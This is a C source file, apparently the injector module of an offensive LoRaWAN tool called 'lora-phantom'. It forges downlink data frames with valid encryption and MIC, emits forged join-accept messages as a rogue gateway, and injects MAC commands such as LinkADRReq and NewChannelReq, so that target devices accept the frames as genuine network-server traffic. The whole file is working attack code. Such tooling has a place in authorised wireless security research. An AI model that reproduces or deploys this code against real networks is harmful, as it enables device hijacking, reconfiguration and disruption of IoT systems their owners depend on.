/*
 * lora-phantom / drivers/injector.c
 * Downlink injection + rogue gateway join-accept generator.
 * Author: jayis1
 * License: GPL-2.0
 * Copyright (c) 2026 jayis1. All rights reserved.
 *
 * The injector constructs and transmits LoRaWAN downlink frames:
 *   - Unconfirmed/confirmed data downlinks (with encrypted FRMPayload + MIC)
 *   - Join-accept responses (for rogue gateway emulation)
 *
 * All frames are built with correct LoRaWAN encoding (little-endian fields,
 * AES-CMAC MIC, AES-CTR FRMPayload encryption) so that target devices accept
 * them as legitimate network-server traffic.
 */

#include "../board.h"
#include "../registers.h"
#include "../types.h"
#include <string.h>

/* Forward declarations */
void aes128_ecb_pub(const uint8_t key[16], const uint8_t in[16], uint8_t out[16]);
void aes_cmac_pub(const uint8_t key[16], const uint8_t *msg, uint32_t len, uint8_t out[16]);
int lw_build_join_accept(const uint8_t *nwk_key, const lw_join_req_t *jr,
                         uint32_t dev_addr, uint8_t *out, uint16_t *out_len);
int lw_decrypt_payload(const uint8_t *skey, uint32_t dev_addr, uint8_t dir,
                       uint16_t fcnt, uint8_t *payload, uint16_t len);
int sx1262_tx_config(uint32_t freq_hz, uint8_t sf, uint8_t bw, uint8_t cr, int8_t power_dbm);
int sx1262_transmit(const uint8_t *buf, uint16_t len, uint32_t timeout_ms);
#define aes128_ecb  aes128_ecb_pub
#define aes_cmac    aes_cmac_pub

/* ---- Build B0 block for MIC (data downlink, dir=1) ---- */
static void build_b0_downlink(uint32_t dev_addr, uint16_t fcnt, uint8_t fopts_len,
                              uint8_t *b0) {
    memset(b0, 0, 16);
    b0[0] = 0x49;
    b0[5] = 1;   /* dir = downlink */
    b0[6] = (uint8_t)(dev_addr & 0xFF);
    b0[7] = (uint8_t)(dev_addr >> 8);
    b0[8] = (uint8_t)(dev_addr >> 16);
    b0[9] = (uint8_t)(dev_addr >> 24);
    b0[10] = (uint8_t)(fcnt & 0xFF);
    b0[11] = (uint8_t)(fcnt >> 8);
    b0[12] = 0;
    b0[13] = 0;
    b0[15] = (uint8_t)(fopts_len);  /* will be set to total len by caller */
}

/* ---- Construct and send a downlink data frame ---- */
int injector_send_downlink(uint32_t dev_addr, uint8_t fctrl, uint16_t fcnt,
                           uint8_t fport, const uint8_t *payload, uint16_t plen,
                           const uint8_t nwk_skey[16], const uint8_t app_skey[16],
                           int confirmed, uint32_t freq_hz, uint8_t sf, int8_t power_dbm) {
    uint8_t frame[272];
    uint16_t p = 0;

    /* MHDR: ConfirmedDataDown (0xA0) or UnconfirmedDataDown (0x60) */
    frame[p++] = confirmed ? 0xA0 : 0x60;
    /* DevAddr (little-endian) */
    frame[p++] = (uint8_t)(dev_addr & 0xFF);
    frame[p++] = (uint8_t)(dev_addr >> 8);
    frame[p++] = (uint8_t)(dev_addr >> 16);
    frame[p++] = (uint8_t)(dev_addr >> 24);
    /* FCtrl: FOptsLen=0, FPending=0, Ack=0, ClassB=0, ADR=0 */
    frame[p++] = fctrl;
    /* FCnt (little-endian) */
    frame[p++] = (uint8_t)(fcnt & 0xFF);
    frame[p++] = (uint8_t)(fcnt >> 8);

    /* FOpts: none (FOptsLen=0 in fctrl) */

    /* FPort + FRMPayload (only if there's a payload) */
    if (plen > 0) {
        frame[p++] = fport;
        /* Encrypt FRMPayload with AppSKey (if FPort>0) or NwkSKey (FPort=0) */
        uint8_t enc[242];
        if (plen > 242) plen = 242;
        memcpy(enc, payload, plen);
        const uint8_t *key = (fport == 0) ? nwk_skey : app_skey;
        lw_decrypt_payload(key, dev_addr, 1, fcnt, enc, plen);  /* encrypt = decrypt (XOR) */
        memcpy(frame + p, enc, plen);
        p += plen;
    }

    /* Compute MIC = AES-CMAC(NwkSKey, B0 | frame-without-MIC) */
    uint8_t b0[16];
    build_b0_downlink(dev_addr, fcnt, 0, b0);
    b0[15] = (uint8_t)p;   /* total frame length without MIC */

    uint8_t cmac_input[272];
    memcpy(cmac_input, b0, 16);
    memcpy(cmac_input + 16, frame, p);

    uint8_t cmac[16];
    aes_cmac(nwk_skey, cmac_input, p + 16, cmac);

    /* Append MIC (4 bytes) */
    frame[p++] = cmac[0];
    frame[p++] = cmac[1];
    frame[p++] = cmac[2];
    frame[p++] = cmac[3];

    /* Transmit */
    if (sx1262_tx_config(freq_hz, sf, 0, 1, power_dbm) != 0) return -1;
    return sx1262_transmit(frame, p, 10000);
}

/* ---- Send a forged join-accept (rogue gateway) ---- */
int injector_send_join_accept(const lw_join_req_t *jr, const uint8_t nwk_key[16],
                              uint32_t dev_addr, uint32_t freq_hz, uint8_t sf,
                              int8_t power_dbm, uint32_t delay_ms) {
    /* Wait for RX1 window (join-accept is sent 5 s after join-request by default,
     * on RX1 DR = join-request DR. The caller specifies delay_ms=0 if already
     * in the window.) */
    if (delay_ms > 0) {
        /* Busy-wait delay — main.c already delayed, so this is usually 0 */
        for (volatile uint32_t i = 0; i < delay_ms * 1000; i++) { }
    }

    /* Build the join-accept frame */
    uint8_t ja[33];
    uint16_t ja_len = 0;
    if (lw_build_join_accept(nwk_key, jr, dev_addr, ja, &ja_len) != 0) return -1;

    /* Transmit on the join-request's frequency + DR (RX1) */
    if (sx1262_tx_config(freq_hz, sf, 0, 1, power_dbm) != 0) return -2;
    return sx1262_transmit(ja, ja_len, 10000);
}

/* ---- Inject a raw MAC command as a downlink ---- */
/* Common MAC commands:
 *   0x03 LinkADRReq (5 bytes payload: DR+TXPower+ChMask+ChMaskCtrl+Redundancy)
 *   0x08 DevStatusReq (0 bytes)
 *   0x0B NewChannelReq (5 bytes)
 *   0x10 TimingReq (0 bytes)
 */
int injector_send_mac_command(uint32_t dev_addr, uint16_t fcnt,
                              uint8_t mac_cmd, const uint8_t *mac_payload, uint8_t mac_len,
                              const uint8_t nwk_skey[16],
                              uint32_t freq_hz, uint8_t sf, int8_t power_dbm) {
    /* MAC commands go in FOpts (encrypted with NwkSKey) or FPort=0 payload.
     * For simplicity, we put them in FPort=0 payload (encrypted with NwkSKey). */
    uint8_t payload[16];
    payload[0] = mac_cmd;
    if (mac_len > 15) mac_len = 15;
    memcpy(payload + 1, mac_payload, mac_len);

    return injector_send_downlink(dev_addr, 0x00, fcnt, 0, payload, mac_len + 1,
                                  nwk_skey, nwk_skey, 0,
                                  freq_hz, sf, power_dbm);
}